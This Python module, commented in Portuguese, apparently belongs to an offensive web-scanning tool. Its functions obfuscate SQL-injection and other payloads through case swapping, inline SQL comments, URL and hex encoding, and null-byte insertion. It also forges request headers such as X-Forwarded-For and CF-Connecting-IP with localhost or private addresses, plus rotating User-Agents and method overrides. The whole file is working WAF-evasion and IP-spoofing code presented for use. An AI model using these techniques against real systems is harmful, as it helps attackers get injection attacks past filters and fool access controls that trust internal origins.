# modules/bypass.py (Advanced Evasion & Logging Update)
import random, re, string
from urllib.parse import quote_plus
from faker import Faker

fake = Faker()

# Pool de User-Agents realistas
MOBILE_UAS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]
DESKTOP_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0"
]

# --- FUNÇÕES DE MUTAÇÃO POLIMÓRFICA ---
def string_to_hex(payload_str):
    """Converte uma string inteira para sua representação hexadecimal."""
    return "0x" + payload_str.encode('utf-8').hex()

def insert_null_bytes(payload):
    """Insere bytes nulos (%00) em posições aleatórias do payload."""
    mutated_payload = ""
    for char in payload:
        mutated_payload += char
        if random.random() < 0.1:  # 10% de chance de inserir um byte nulo
            mutated_payload += "%00"
    return mutated_payload

# --- FUNÇÃO DE MUTAÇÃO APRIMORADA COM LOGGING ---
def mutate_payload(raw_payload, log_func=None):
    """
    Aplica uma série de mutações polimórficas para ofuscar o payload.
    """
    payload = str(raw_payload)
    if log_func:
        log_func(f"Bypass - Payload Original: {payload[:80]}", "DEBUG")

    # Lista de possíveis técnicas de ofuscação
    mutations = [
        (lambda p: ''.join(c.lower() if random.getrandbits(1) else c.upper() for c in p), "CaseSwap"),
        (lambda p: re.sub(r"\b(SELECT|UNION|FROM)\b", lambda m: m.group(1)[:2] + "/**/" + m.group(1)[2:], p, flags=re.IGNORECASE), "SQLComment"),
        (lambda p: quote_plus(p) if random.random() < 0.2 else p, "URLEncode"),
        (insert_null_bytes, "NullByte"),
        (lambda p: string_to_hex(p) if " " not in p and random.random() < 0.15 else p, "HexEncode")
    ]
    
    # Aplica um número aleatório de mutações (de 1 a 3)
    num_mutations_to_apply = random.randint(1, 3)
    applied_mutations = random.sample(mutations, num_mutations_to_apply)
    
    mutation_names = []
    for mutation_func, name in applied_mutations:
        payload = mutation_func(payload)
        mutation_names.append(name)

    if log_func:
        log_func(f"Bypass - Payload Mutado com [{', '.join(mutation_names)}]: {payload[:80]}", "DEBUG")
        
    return payload

# --- FUNÇÃO DE HEADERS APRIMORADA COM LOGGING ---
def bypass_headers(original_headers, log_func=None):
    """
    Gera um conjunto de headers para spoofing avançado e evasão.
    """
    headers = original_headers.copy()
    
    # 1. Rotação de User-Agent
    pool = MOBILE_UAS if random.getrandbits(1) else DESKTOP_UAS
    headers['User-Agent'] = random.choice(pool)

    # 2. Spoofing de Infraestrutura Interna e Proxies
    spoof_ip = random.choice([
        "127.0.0.1",
        "10.0.0.1", "192.168.1.1",
        fake.ipv4_private(),
        fake.ipv4()
    ])
    
    headers['X-Forwarded-For'] = spoof_ip
    headers['X-Forwarded-Host'] = fake.domain_name()
    headers['X-Client-IP'] = spoof_ip
    headers['X-Real-IP'] = spoof_ip
    headers['CF-Connecting-IP'] = spoof_ip
    
    # 3. Headers de Bypass Gerais
    headers['Referer'] = f"http://{fake.domain_name( )}/"
    if random.random() < 0.5:
        headers['X-HTTP-Method-Override'] = random.choice(['POST', 'GET', 'PUT'])

    if log_func:
        log_func(f"Bypass - Headers gerados. User-Agent: ..., Spoofed-IP: {spoof_ip}", "DEBUG")

    return headers
